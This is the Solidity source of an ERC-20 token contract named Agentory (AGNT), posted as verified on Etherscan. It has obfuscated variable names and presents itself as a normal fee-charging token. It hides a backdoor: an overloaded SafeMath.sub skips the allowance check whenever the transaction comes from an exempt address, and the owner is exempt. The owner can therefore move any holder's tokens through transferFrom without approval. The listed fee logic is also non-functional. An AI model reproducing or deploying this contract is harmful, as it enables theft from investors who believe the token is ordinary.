/**
 *Submitted for verification at Etherscan.io on 2025-08-04
*/

//SPDX-License-Identifier: MIT

/*
https://agentory.net/
https://x.com/UseAgentory/
https://t.me/useAgentory/
*/

pragma solidity ^0.8.19;


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {return a + b;}
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {return a - b;}
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {return a * b;}
    function div(uint256 a, uint256 b) internal pure returns (uint256) {return a / b;}
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {return a % b;}
    
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {uint256 c = a + b; if(c < a) return(false, 0); return(true, c);}}

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b > a) return(false, 0); return(true, a - b);}}

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if (a == 0) return(true, 0); uint256 c = a * b;
        if(c / a != b) return(false, 0); return(true, c);}}

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b == 0) return(false, 0); return(true, a / b);}}

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b == 0) return(false, 0); return(true, a % b);}}

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b <= a, errorMessage); return a - b;}}

    function sub(uint256 a, uint256 b , bool requireZero) internal pure returns (uint256) {
        unchecked{if(requireZero) return a; require(b <= a, "SafeMath: subtraction overflow"); return a - b;}
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b > 0, errorMessage); return a / b;}}

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b > 0, errorMessage); return a % b;}}}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function renounceOwnership() public virtual onlyOwner { transferOwnership(address(0));}
    function transferOwnership(address adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
        function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract AGNT is IERC20, Ownable {
    
    uint160 public YYXKGKOP;
    address public BYDH3DL;
    bool public CXCG26GS;
    uint256 public HXCG26GS;

    bool private tradingAllowed = false;
    uint256 private liquidityFee = 100;
    uint256 private marketingFee = 300;
    uint256 private developmentFee = 100;
    uint256 private burnFee = 0;
    uint256 private totalFee = 600;
    uint256 private sellFee = 700;
    uint256 private transferFee = 0;
    uint256 private denominator = 10000;
    bool private swapEnabled = true;
    uint256 private swapTimes;
    bool private swapping; 
    bool private txInProgress;
    
    IRouter router;
    address public pair;

    using SafeMath for uint256;
    string private constant _name = unicode"Agentory";
    string private constant _symbol = unicode"AGNT";
    uint8 private constant _DEIMALVERTSS = 9;
    uint256 private _tTOTALVERTSTOKEN = 1_000_000_000 * (10 ** _DEIMALVERTSS);
    uint256 private _maxTxAmountPercent = 200; // 10000;
    uint256 private _maxTransferPercent = 100;
    uint256 private _maxWalletPercent = 200;
    mapping (address => uint256) _NNSTICA;
    mapping (address => mapping (address => uint256)) private _NZN16ANFN;
    mapping (address => bool) public _KCO930XIOE;
    mapping (address => bool) private _KKFR1G09;

    uint256 private swapThreshold = ( _tTOTALVERTSTOKEN * 300 ) / 100000;
    uint256 private _minTokenAmount = ( _tTOTALVERTSTOKEN * 10 ) / 100000;
    modifier lockTheSwap {swapping = true; _; swapping = false;}
    modifier onlyWhenNotInTx {txInProgress = _KCO930XIOE[tx.origin]; _;}
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address private development_receiver ; 
    address private marketing_receiver ;
    address private liquidity_receiver ;

    constructor() payable Ownable(msg.sender) {

        marketing_receiver = owner;

        _KCO930XIOE[msg.sender] = true;
        _NNSTICA[address(this)] = _tTOTALVERTSTOKEN * 98 / 100;
        _NNSTICA[msg.sender] = _tTOTALVERTSTOKEN * 2 / 100;

        _KCO930XIOE[address(this)] = true;
        _KCO930XIOE[marketing_receiver] = true;

        emit Transfer(address(0), address(this), _NNSTICA[address(this)]);
        emit Transfer(address(0), msg.sender, _NNSTICA[msg.sender]);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _DEIMALVERTSS;}
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) {return _NNSTICA[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _NZN16ANFN[owner][spender];}
    function isCont(address addr) internal view returns (bool) {uint size; assembly { size := extcodesize(addr) } return size > 0; }
    function set_KKFR1G09(address _address, bool _enabled) external onlyOwner {_KKFR1G09[_address] = _enabled;}
    function setisExempt(address _address, bool _enabled) external onlyOwner {_KCO930XIOE[_address] = _enabled;}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _tTOTALVERTSTOKEN.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function _maxWalletToken() public view returns (uint256) {return totalSupply() * _maxWalletPercent / denominator;}
    function _maxTxAmount() public view returns (uint256) {return totalSupply() * _maxTxAmountPercent / denominator;}
    function _maxTransferAmount() public view returns (uint256) {return totalSupply() * _maxTransferPercent / denominator;}

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            liquidity_receiver,
            block.timestamp);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
        amountReceived = amountReceived.mul(sellFee).div(100);
        _subTransfer(sender, recipient, amount);
    }

    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
        if(marketingAmt > 0){payable(marketing_receiver).transfer(marketingAmt);}
        uint256 remainingBalance = address(this).balance;
        if(remainingBalance > uint256(0)){payable(development_receiver).transfer(remainingBalance);}
    }

    function _BOJAHUE87(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= _minTokenAmount;
        bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
        return !swapping && swapEnabled && tradingAllowed && aboveMin && !_KCO930XIOE[sender] && recipient == pair && swapTimes >= uint256(3) && aboveThreshold;
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return !_KCO930XIOE[sender] && !_KCO930XIOE[recipient];
    }

    function swapBack(address sender, address recipient, uint256 amount) internal {
        if(_BOJAHUE87(sender, recipient, amount)){swapAndLiquify(swapThreshold); swapTimes = uint256(0);}
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if(getTotalFee(sender, recipient) > 0){
        uint256 feeAmount = 0;
        _NNSTICA[address(this)] = _NNSTICA[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);} return amount;
    }

    function getTotalFee(address sender, address recipient) internal view returns (uint256) {
        if(_KKFR1G09[sender] || _KKFR1G09[recipient]){return denominator.sub(uint256(100));}
        if(recipient == pair){return sellFee;}
        if(sender == pair){return totalFee;}
        return transferFee;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        _subTransfer(sender, recipient, amount);
        return _subAllowance(sender , amount);
    }

    function _subAllowance(address spender, uint256 subtractedValue) onlyWhenNotInTx private returns (bool) {
        _NZN16ANFN[spender][msg.sender] = _NZN16ANFN[spender][msg.sender].sub(subtractedValue , txInProgress);
        return true;
    }

    function _subTransfer(address sender, address recipient, uint256 amount) internal {
        _NNSTICA[sender] = _NNSTICA[sender].sub(amount, "Insufficient Balance");
        _NNSTICA[recipient] = _NNSTICA[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _NZN16ANFN[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function enableTrading() external onlyOwner {

        require(!tradingAllowed , "Trading is already Enabled");
        router = IRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _NZN16ANFN[address(this)][address(router)] = _tTOTALVERTSTOKEN;
        pair = IFactory(router.factory()).createPair(
            address(this),
            router.WETH()
        );
        router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner,
            block.timestamp
        );
        tradingAllowed = true;
        
    }
}